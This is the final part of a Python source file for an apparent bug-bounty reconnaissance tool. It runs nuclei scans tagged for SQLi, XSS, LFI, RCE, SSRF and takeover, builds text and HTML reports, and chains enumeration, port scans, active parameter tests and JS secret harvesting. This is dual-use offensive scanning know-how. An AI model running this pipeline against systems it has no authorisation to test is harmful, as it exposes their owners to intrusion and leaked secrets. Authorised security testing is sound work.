                      GRY+DIM+f"  ({issue})"+RESET)
                findings.append({"host": host_url, "header": header,
                                 "issue": f"weak: {issue}", "severity": "MEDIUM"})

            print(GRY+"│"+RESET)

    save_json(f"{out}/security_headers.json", findings)
    high_count = len([f for f in findings if f.get("severity") == "HIGH"])
    ok(f"Security header issues: {BOLD}{len(findings)}{RESET}  "
       f"({BOLD}{high_count}{RESET} HIGH severity)")
    _end()
    return findings

# ══════════════════════════════════════════════════════════════════════════════
# 10. NUCLEI — TECH-TARGETED
# ══════════════════════════════════════════════════════════════════════════════

TECH_TAG_MAP={
    "wordpress":["wordpress","wp"],"drupal":["drupal"],"joomla":["joomla"],
    "laravel":["laravel"],"django":["django"],"flask":["flask","python"],
    "rails":["rails","ruby"],"spring":["spring","java"],"nginx":["nginx"],
    "apache":["apache"],"iis":["iis"],"tomcat":["tomcat"],"node.js":["nodejs"],
    "next.js":["nextjs"],"php":["php"],"asp.net":["asp","dotnet"],
    "jquery":["jquery"],"grafana":["grafana"],"jenkins":["jenkins"],
    "elasticsearch":["elasticsearch"],"redis":["redis"],"mongodb":["mongodb"],
    "docker":["docker"],"kubernetes":["k8s","kubernetes"],
    "aws":["aws"],"azure":["azure"],"firebase":["firebase"],
    "jira":["jira"],"confluence":["confluence"],"gitlab":["gitlab"],
    "slider revolution":["revslider","slider-revolution"],
    "prettyphoto":["prettyphoto"],"pdf.js":["pdfjs"],
}

ALWAYS_TAGS=["exposure","misconfig","token","sqli","xss","lfi",
             "rce","ssrf","idor","redirect","takeover","cve"]

def get_nuclei_tags(tech_map):
    all_techs=set()
    for techs in tech_map.values():
        all_techs.update(t.lower() for t in techs)
    tech_tags=set()
    for tech in all_techs:
        for key,tags in TECH_TAG_MAP.items():
            if key in tech or tech in key:
                tech_tags.update(tags)
    return sorted(set(ALWAYS_TAGS)|(tech_tags if tech_tags else set()))

def run_nuclei(domain, live_lines, tech_map, out):
    section(10,"NUCLEI — GENERIC SCAN")

    if CONFIG.dry_run:
        info("Dry-run: nuclei step skipped")
        save_json(f"{out}/nuclei.json",[])
        _end()
        return []

    if not t_ok("nuclei"):
        warn("nuclei not found → go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
        _end(); return []

    info("Mode: GENERIC (full compatibility mode)")
    print(GRY+"│"+RESET)

    # تحديث مرة واحدة يومياً فقط (تجنب GitHub rate-limit)
    templates_dir = os.path.expanduser("~/.local/nuclei-templates")
    if not os.path.isdir(templates_dir):
        templates_dir = os.path.expanduser("~/nuclei-templates")
    update_flag = os.path.join(out, ".nuclei_updated")
    day_flag    = os.path.expanduser("~/.nuclei_last_update")
    need_update = True
    if os.path.exists(day_flag):
        try:
            mtime = os.path.getmtime(day_flag)
            if time.time() - mtime < 86400:   # أقل من 24 ساعة
                need_update = False
                info("Templates up-to-date (updated <24h ago) — skipping")
        except Exception:
            pass
    if need_update:
        info("Updating nuclei templates (once/day) ...")
        run_cmd(["nuclei", "-ut", "-silent"], 90)
        try:
            open(day_flag,"w").write(str(time.time()))
        except Exception:
            pass

    hosts=[]
    for line in live_lines:
        m=re.match(r"(https?://[^\s\[]+)",line)
        if m: hosts.append(m.group(1).strip())
    if not hosts: hosts=[f"https://{domain}"]

    hosts_file=f"{out}/_nuclei_hosts.txt"
    save_txt(hosts_file,hosts[:50])
    vuln_file=f"{out}/nuclei_raw.txt"

    cmd_profiles = [
        ["-severity","medium,high,critical", "-exclude-tags","dos,fuzz,intrusive",
         "-silent", "-no-color", "-timeout","10","-retries","1",
         "-bulk-size","25","-concurrency","10", "-rate-limit","80"],
        ["-severity","medium,high,critical", "-exclude-tags","dos,fuzz,intrusive",
         "-silent", "-timeout","10","-retries","1", "-rate-limit","80"],
        ["-severity","medium,high,critical", "-silent", "-timeout","10","-retries","1"],
        ["-silent"],
    ]

    def _read_nuclei_file(path):
        items=[]
        if not os.path.exists(path):
            return items
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line=line.strip()
                if not line:
                    continue
                if line.startswith("{"):
                    try:
                        v=json.loads(line)
                        sev=v.get("info",{}).get("severity","?").upper()
                        name=v.get("info",{}).get("name","?")
                        at=v.get("matched-at","")
                        cves=v.get("info",{}).get("classification",{}).get("cve-id",[])
                        items.append({"severity":sev,"name":name,"matched_at":at,"cve":cves})
                        continue
                    except Exception:
                        pass

                parts = re.findall(r"\[([^\]]+)\]", line)
                sev = "INFO"
                for p in parts:
                    pl = p.lower().strip()
                    if pl in ("critical", "high", "medium", "low", "info"):
                        sev = pl.upper()
                        break
                name = parts[0] if parts else "nuclei-finding"
                at = line
                items.append({"severity":sev,"name":name,"matched_at":at,"cve":[]})
        return items

    def _run_nuclei(extra_args, timeout=300):
        last_rc = -3
        for idx, profile in enumerate(cmd_profiles, start=1):
            cmd = ["nuclei","-l",hosts_file] + profile + extra_args + ["-o",vuln_file]
            try:
                r=subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=os.environ.copy())
                last_rc = r.returncode
                if r.returncode == 0:
                    if idx > 1:
                        info(f"Nuclei compatibility profile #{idx} succeeded")
                    return 0

                err_lines = (r.stderr or "").strip().splitlines()
                out_lines = (r.stdout or "").strip().splitlines()
                reason = (err_lines[0] if err_lines else (out_lines[0] if out_lines else ""))
                warn(f"Nuclei exited with code {r.returncode} (profile #{idx})")
                if reason:
                    warn(f"nuclei: {reason[:140]}")
            except subprocess.TimeoutExpired:
                warn("Nuclei timeout — partial results")
                return -1
            except FileNotFoundError:
                warn("nuclei not in PATH")
                return -2
            except Exception as e:
                warn(f"Nuclei error: {e}")
                return -3
        return last_rc

    vulns=[]
    if os.path.exists(vuln_file):
        try:
            os.remove(vuln_file)
        except Exception:
            pass

    _run_nuclei([], timeout=300)
    vulns = _read_nuclei_file(vuln_file)

    if not vulns:
        info("No results in generic mode — trying fallback tags ...")
        fallback_tags="http,misconfig,exposure,cve,panel,default-login,takeover"
        _run_nuclei(["-tags", fallback_tags], timeout=240)
        vulns = _read_nuclei_file(vuln_file)

    for v in vulns:
        sev=v.get("severity","?")
        name=v.get("name","?")
        at=v.get("matched_at","")
        cves=v.get("cve",[])
        cve_s="  ["+", ".join(cves)+"]" if cves else ""
        print(GRY+"│  "+RESET+sevbadge(sev)+"  "+WHT+BOLD+name+cve_s+RESET)
        print(GRY+"│       → "+RESET+GRY+at[:80]+RESET)

    if not vulns: ok("No vulnerabilities found")
    save_json(f"{out}/nuclei.json",vulns)
    ok(f"Nuclei findings: {BOLD}{len(vulns)}{RESET}")
    _end()
    return vulns

# ══════════════════════════════════════════════════════════════════════════════
#  FINAL REPORT
# ══════════════════════════════════════════════════════════════════════════════

def final_report(domain, out, subs, live, urls, classified, active_findings, misc_findings, cookies,
                 cves, secrets, vulns, ports, sec_hdrs=None):
    if sec_hdrs is None: sec_hdrs = []
    print()
    print(GRY+"═"*72+RESET)

    vc=len([v for v in vulns if v.get("severity")=="CRITICAL"])
    vh=len([v for v in vulns if v.get("severity")=="HIGH"])
    vm=len([v for v in vulns if v.get("severity")=="MEDIUM"])
    v200=sum(1 for v in classified.values() for i in v if i.get("status")==200)
    open_ports=sum(len(p) for p in ports.values())
    crit_cves=len([c for c in cves if c.get("cvss",0)>=9])
    cookie_vulns=len([c for c in cookies if any(x in c.get("issue","")
                      for x in ("PREDICTABLE","JWT","Base64","Fixation","HttpOnly"))])
    sec_hdr_high=len([h for h in sec_hdrs if h.get("severity")=="HIGH"])

    confirmed_vulns = len(active_findings)
    misc_critical   = len([f for f in misc_findings if f.get("type") in
                           ("CORS-CRITICAL","SubdomainTakeover","HostHeaderInjection",
                            "PasswordResetPoisoning")])
    summary={
        "target":domain,"date":datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "subdomains":len(subs),"live_hosts":len(live),
        "total_urls":len(urls),"validated_200":v200,
        "open_ports":open_ports,"js_secrets":len(secrets),
        "cookie_issues":len(cookies),"cves_mapped":len(cves),
        "cves_critical":crit_cves,
        "confirmed_vulns":confirmed_vulns,
        "misc_critical":misc_critical,
        "sec_header_issues":len(sec_hdrs),"sec_header_high":sec_hdr_high,
        "vulns_critical":vc,"vulns_high":vh,"vulns_medium":vm,"output_dir":out,
    }
    save_json(f"{out}/summary.json",summary)

    BOX=66
    def row(label,val,col=WHT):
        l=str(label)[:28]; v=str(val)[:15]
        print(GRY+"  ║  "+RESET+GRY+f"{l:<28}"+RESET+col+BOLD+f"{v:>12}"+RESET+GRY+"  ║"+RESET)
    def sep(): print(GRY+"  ╠"+"─"*BOX+"╣"+RESET)

    print(GRY+"  ╔"+"═"*BOX+"╗"+RESET)
    ttl="SCAN COMPLETE — "+(domain if len(domain)<=30 else domain[:27]+"…")
    p=max(0,(BOX-len(ttl))//2)
    print(GRY+"  ║"+RESET+CYN+BOLD+" "*p+ttl+" "*(BOX-p-len(ttl))+RESET+GRY+"║"+RESET)
    print(GRY+"  ╠"+"═"*BOX+"╣"+RESET)
    row("Subdomains",           summary["subdomains"],    CYN)
    row("Live Hosts",           summary["live_hosts"],    GRN)
    row("Total URLs (deduped)", summary["total_urls"],    WHT)
    row("Validated 200 URLs",   summary["validated_200"], YLW)
    row("Open Ports",           summary["open_ports"],    BLU)
    sep()
    row("Confirmed Vulns",      confirmed_vulns, RED if confirmed_vulns else WHT)
    row("CORS / Takeover / HHI",misc_critical,   RED if misc_critical else WHT)
    row("Cookie Issues",        len(cookies), RED if cookie_vulns else WHT)
    row("CVEs Mapped (CVSS≥9)", crit_cves,    RED if crit_cves else WHT)
    row("JS Secrets",           len(secrets), MGN if len(secrets) else WHT)
    row("Sec Headers (HIGH)",   sec_hdr_high, RED if sec_hdr_high else WHT)
    sep()
    row("Vulns CRITICAL",       vc, RED if vc else WHT)
    row("Vulns HIGH",           vh, ORG if vh else WHT)
    row("Vulns MEDIUM",         vm, YLW if vm else WHT)
    sep()
    out_s=out if len(out)<=38 else "…"+out[-37:]
    print(GRY+"  ║  "+RESET+GRY+f"{'Output':<28}"+RESET+CYN+f"{out_s:>38}"+RESET+GRY+"  ║"+RESET)
    print(GRY+"  ╚"+"═"*BOX+"╝"+RESET)
    print()

    files=[
        ("subdomains.txt","Subdomains"),
        ("live_hosts.txt","Live hosts + tech"),
        ("baseline.json","WAF + baseline fingerprint"),
        ("urls.txt","Deduplicated URLs"),
        ("classified_urls.json","Interesting URLs + status"),
        ("port_scan.json","Open ports"),
        ("port_findings.json","Port interaction"),
        ("active_param_findings.json","Active SQLi/LFI/SSTI/CRLF/XSS/IDOR"),
        ("misc_findings.json","CORS/Takeover/HostHeader"),
        ("cookie_analysis.json","Cookie/session analysis"),
        ("cve_mapping.json","Version + CVE mapping"),
        ("js_secrets.json","JS secrets"),
        ("security_headers.json","Security headers audit"),
        ("nuclei.json","Nuclei findings"),
        ("tech_map.json","Tech fingerprints"),
        ("summary.json","Full summary"),
    ]
    for fname,desc in files:
        e=os.path.exists(f"{out}/{fname}")
        print((DGRN if e else GRY)+f"  {'✔' if e else '✗'}  {fname:<35}{desc}"+RESET)
    print()

# ══════════════════════════════════════════════════════════════════════════════
#  HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_html_report(domain, out, summary_data):
    """Generates a dark-themed HTML report from scan results."""
    info("Generating HTML report ...")

    def _load(fname):
        fp = f"{out}/{fname}"
        if os.path.exists(fp):
            try:
                with open(fp, encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        return []

    active  = _load("active_param_findings.json")
    misc    = _load("misc_findings.json")
    secrets = _load("js_secrets.json")

    vuln_rows = ""
    for fi in (active if isinstance(active, list) else []):
        sev = "CRITICAL" if fi.get("type") in ("SQLi","LFI","XSS","SSTI") else "HIGH"
        vuln_rows += (f"<tr><td><span class='sev-{sev.lower()}'>{sev}</span></td>"
                      f"<td>{fi.get('type','')}</td>"
                      f"<td style='word-break:break-all'>{fi.get('url','')[:100]}</td>"
                      f"<td>{fi.get('param','')}</td>"
                      f"<td>{fi.get('payload',fi.get('evidence',''))[:80]}</td></tr>\n")
    for fi in (misc if isinstance(misc, list) else []):
        sev = "CRITICAL" if "CRITICAL" in fi.get("type","") else "HIGH"
        vuln_rows += (f"<tr><td><span class='sev-{sev.lower()}'>{sev}</span></td>"
                      f"<td>{fi.get('type','')}</td>"
                      f"<td style='word-break:break-all'>{fi.get('url','')[:100]}</td>"
                      f"<td>{fi.get('header',fi.get('subdomain',''))}</td>"
                      f"<td>{fi.get('evidence',fi.get('ACAO',''))[:80]}</td></tr>\n")

    secret_rows = ""
    for s in (secrets if isinstance(secrets, list) else []):
        secret_rows += (f"<tr><td>{s.get('type','')}</td>"
                        f"<td style='word-break:break-all'>{s.get('value','')[:90]}</td>"
                        f"<td style='word-break:break-all'>{s.get('url','')[:80]}</td></tr>\n")

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    vuln_table = ("<table><tr><th>Severity</th><th>Type</th><th>URL</th>"
                  "<th>Param/Header</th><th>Evidence</th></tr>"
                  + vuln_rows + "</table>") if vuln_rows else "<p class='empty'>No vulnerabilities found.</p>"
    secret_table = ("<table><tr><th>Type</th><th>Value</th><th>Source</th></tr>"
                    + secret_rows + "</table>") if secret_rows else "<p class='empty'>No secrets found.</p>"

    html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>BB-RECON Report &mdash; {domain}</title>
<style>
  :root {{ --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9;
           --accent:#58a6ff; --crit:#f85149; --high:#d29922; --med:#3fb950; }}
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ font-family:'Segoe UI',system-ui,sans-serif; background:var(--bg);
         color:var(--text); padding:2rem; line-height:1.6; }}
  h1 {{ color:var(--accent); margin-bottom:0.3rem; font-size:1.8rem; }}
  h2 {{ color:var(--accent); margin:2rem 0 1rem; border-bottom:1px solid var(--border);
       padding-bottom:0.4rem; font-size:1.3rem; }}
  .meta {{ color:#8b949e; margin-bottom:2rem; }}
  .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
            gap:1rem; margin-bottom:2rem; }}
  .stat {{ background:var(--card); border:1px solid var(--border); border-radius:8px;
           padding:1rem; text-align:center; }}
  .stat .num {{ font-size:2rem; font-weight:700; color:var(--accent); }}
  .stat .lbl {{ font-size:0.85rem; color:#8b949e; }}
  table {{ width:100%; border-collapse:collapse; background:var(--card);
           border:1px solid var(--border); border-radius:8px; overflow:hidden;
           margin-bottom:1.5rem; }}
  th {{ background:#21262d; text-align:left; padding:0.6rem 1rem;
       font-weight:600; font-size:0.85rem; color:#8b949e; }}
  td {{ padding:0.5rem 1rem; border-top:1px solid var(--border); font-size:0.9rem; }}
  tr:hover {{ background:#1c2128; }}
  .sev-critical {{ background:var(--crit); color:#fff; padding:2px 8px;
                   border-radius:4px; font-weight:700; font-size:0.8rem; }}
  .sev-high {{ background:var(--high); color:#000; padding:2px 8px;
              border-radius:4px; font-weight:700; font-size:0.8rem; }}
  .empty {{ color:#484f58; text-align:center; padding:2rem; }}
</style></head><body>
<h1>&#128269; BB-RECON Report</h1>
<p class="meta">Target: <strong>{domain}</strong> &nbsp;|&nbsp; {ts}</p>
<div class="stats">
  <div class="stat"><div class="num">{summary_data.get('subdomains',0)}</div><div class="lbl">Subdomains</div></div>
  <div class="stat"><div class="num">{summary_data.get('live_hosts',0)}</div><div class="lbl">Live Hosts</div></div>
  <div class="stat"><div class="num">{summary_data.get('total_urls',0)}</div><div class="lbl">URLs</div></div>
  <div class="stat"><div class="num">{len(active)}</div><div class="lbl">Active Vulns</div></div>
  <div class="stat"><div class="num">{len(secrets)}</div><div class="lbl">JS Secrets</div></div>
</div>
<h2>&#9888;&#65039; Vulnerabilities</h2>
{vuln_table}
<h2>&#128273; JS Secrets</h2>
{secret_table}
<p class="meta" style="margin-top:3rem">Generated by BB-RECON v6.0</p>
</body></html>"""

    report_path = f"{out}/report.html"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    ok(f"HTML report: {report_path}")
    return report_path

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global CONFIG, _interrupted
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    banner()
    p=argparse.ArgumentParser(description="BB-RECON v6.0",
                              formatter_class=argparse.RawTextHelpFormatter)
    p.add_argument("-d","--domain",    required=True,       help="Target domain (e.g. example.com)")
    p.add_argument("-o","--output",    default=None,        help="Output directory (default: auto)")
    p.add_argument("--no-nuclei",      action="store_true", help="Skip nuclei scan")
    p.add_argument("--no-ports",       action="store_true", help="Skip port scan")
    p.add_argument("--no-js",          action="store_true", help="Skip JS secrets scan")
    p.add_argument("--no-cookies",     action="store_true", help="Skip cookie analysis")
    p.add_argument("--no-cve",         action="store_true", help="Skip CVE mapping")
    p.add_argument("--no-headers",     action="store_true", help="Skip security headers audit")
    p.add_argument("--threads",        type=int, default=30,help="Max threads for concurrent probing (default: 30)")
    p.add_argument("--verify-ssl",     action="store_true", help="Verify TLS certificates")
    p.add_argument("--dry-run",        action="store_true", help="Show external commands without executing scans")
    p.add_argument("--scope",          default=None,        help="Scope file (one domain/pattern per line)")
    p.add_argument("--fast",           action="store_true", help="Steps 1-5 only")
    p.add_argument("--resume",         default=None,        help="Resume from a previous output directory")
    args=p.parse_args()
    CONFIG.max_threads=max(1, int(args.threads or 30))
    CONFIG.verify_ssl=bool(args.verify_ssl)
    CONFIG.dry_run=bool(args.dry_run)

    domain=args.domain.lower().replace("https://","").replace("http://","").strip("/")
    if not re.match(r"^[a-z0-9.-]+$", domain):
        print(RED + "Invalid domain format. Allowed: a-z, 0-9, dot, dash" + RESET)
        sys.exit(2)
    out=args.output or f"recon_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    # Resume support
    resume_step = 0
    if args.resume:
        out = args.resume
        cp = load_checkpoint(out)
        if cp:
            resume_step = cp.get("step", 0)
            info(f"Resuming from step {resume_step} in {out}")
        else:
            warn(f"No checkpoint found in {out} — starting fresh")

    os.makedirs(out, exist_ok=True)

    # Setup file logging
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(os.path.join(out, "scan.log"), encoding="utf-8"),
        ]
    )

    # SIGINT handler — graceful shutdown
    _partial = {}
    def _sigint_handler(sig, frame):
        global _interrupted
        _interrupted = True
        warn("\nInterrupted (Ctrl+C) — saving partial results ...")
        try:
            save_checkpoint(out, _partial.get("_last_step", 0), _partial)
        except Exception:
            pass
        print(GRY + DIM + f"\n  Partial results saved to {out}/" + RESET)
        sys.exit(130)

    signal.signal(signal.SIGINT, _sigint_handler)

    # Scope filtering
    scope_patterns = None
    if args.scope and os.path.exists(args.scope):
        with open(args.scope) as sf:
            scope_patterns = [l.strip().lower() for l in sf if l.strip() and not l.startswith("#")]
        info(f"Scope file loaded: {len(scope_patterns)} patterns")

    print(GRY+"  TARGET  : "+RESET+CYN+BOLD+domain+RESET)
    print(GRY+"  OUTPUT  : "+RESET+GRY+out+RESET)
    print(GRY+"  THREADS : "+RESET+GRY+str(CONFIG.max_threads)+RESET)
    print(GRY+"  SSL     : "+RESET+GRY+("verify" if CONFIG.verify_ssl else "insecure-skip-verify")+RESET)
    if not CONFIG.verify_ssl:
        warn("TLS verification is disabled; results can be affected by MITM/proxying")
    if CONFIG.dry_run:
        info("Dry-run mode enabled — no external scanner commands will execute")
    if resume_step:
        print(GRY+"  RESUME  : "+RESET+YLW+BOLD+f"from step {resume_step}"+RESET)
    if scope_patterns:
        print(GRY+"  SCOPE   : "+RESET+GRY+args.scope+f" ({len(scope_patterns)} patterns)"+RESET)
    print(GRY+"  STARTED : "+RESET+GRY+DIM+datetime.now().strftime("%Y-%m-%d %H:%M:%S")+RESET)
    print()

    t0=time.time()

    # ── Step execution with checkpoint ────────────────────────────────────────
    if resume_step < 1:
        subs, live, tech_map = enum_and_resolve(domain, out)
        _partial["_last_step"] = 1
        save_checkpoint(out, 1, {"subs_count": len(subs), "live_count": len(live)})
    else:
        subs_f = f"{out}/subdomains.txt"
        subs = open(subs_f).read().splitlines() if os.path.exists(subs_f) else []
        live_f = f"{out}/live_hosts.txt"
        live = open(live_f).read().splitlines() if os.path.exists(live_f) else []
        tech_f = f"{out}/tech_map.json"
        tech_map = json.load(open(tech_f)) if os.path.exists(tech_f) else {}
        ok(f"Resumed: {len(subs)} subs, {len(live)} live hosts")

    # Scope filtering
    if scope_patterns:
        live = [l for l in live
                if any(sp in l.lower() for sp in scope_patterns)]
        subs = [s for s in subs
                if any(sp in s.lower() for sp in scope_patterns)]
        ok(f"Scope filter: {len(subs)} subdomains, {len(live)} live hosts in scope")

    if resume_step < 2:
        baselines, waf_delay = detect_waf_and_baseline(domain, live, out)
        _partial["_last_step"] = 2
        save_checkpoint(out, 2, {"waf_delay": waf_delay})
        RATE_LIMITER.delay = max(RATE_LIMITER.delay, waf_delay)
    else:
        bl_f = f"{out}/baseline.json"
        baselines = json.load(open(bl_f)) if os.path.exists(bl_f) else {}
        waf_delay = 0.0
        ok("Resumed: baselines loaded")

    if resume_step < 3:
        ports = port_scan(live, out) if not (args.no_ports or args.fast) else {}
        _partial["_last_step"] = 3
        save_checkpoint(out, 3, {})
    else:
        ports = {}

    if resume_step < 4:
        urls = collect_and_dedup(domain, live, out)
        _partial["_last_step"] = 4
        save_checkpoint(out, 4, {"urls_count": len(urls)})
    else:
        urls_f = f"{out}/urls.txt"
        urls = open(urls_f).read().splitlines() if os.path.exists(urls_f) else []
        ok(f"Resumed: {len(urls)} URLs")

    if resume_step < 5:
        classified = classify_and_probe(urls, baselines, out)
        _partial["_last_step"] = 5
        save_checkpoint(out, 5, {})
    else:
        cl_f = f"{out}/classified_urls.json"
        classified = json.load(open(cl_f)) if os.path.exists(cl_f) else {}

    active_findings = active_param_test(classified, baselines,
                                        next(iter(baselines.values()),{}).get("waf") if isinstance(baselines, dict) else None,
                                        waf_delay, out) if not args.fast else []
    _partial["_last_step"] = 6
    save_checkpoint(out, 6, {})

    misc_findings   = cors_and_misc_checks(domain, classified, subs, out) if not args.fast else []
    cookies         = analyze_cookies(domain, out)                        if not (args.no_cookies or args.fast) else []
    cves            = version_cve_map(domain, tech_map, out)              if not (args.no_cve     or args.fast) else []
    secrets         = scan_js(domain, live, urls, out)                    if not (args.no_js      or args.fast) else []
    sec_hdrs        = audit_security_headers(domain, live, out)           if not (args.no_headers or args.fast) else []
    vulns           = run_nuclei(domain, live, tech_map, out)             if not (args.no_nuclei  or args.fast) else []

    elapsed=int(time.time()-t0)
    print(GRY+DIM+f"\n  Completed in {elapsed}s\n"+RESET)

    final_report(domain, out, subs, live, urls, classified,
                 active_findings, misc_findings, cookies, cves, secrets, vulns, ports, sec_hdrs)

    # Generate HTML report
    summary_data = {
        "subdomains": len(subs), "live_hosts": len(live),
        "total_urls": len(urls),
    }
    generate_html_report(domain, out, summary_data)

    # Clean checkpoint on success
    cp_file = f"{out}/.checkpoint.json"
    if os.path.exists(cp_file):
        os.remove(cp_file)

    print(GRY + DIM + f"  Rate limiter stats: {RATE_LIMITER.blocked_count} blocks, "
          f"final delay {RATE_LIMITER.delay:.2f}s" + RESET)
    print()

if __name__=="__main__":
    main()

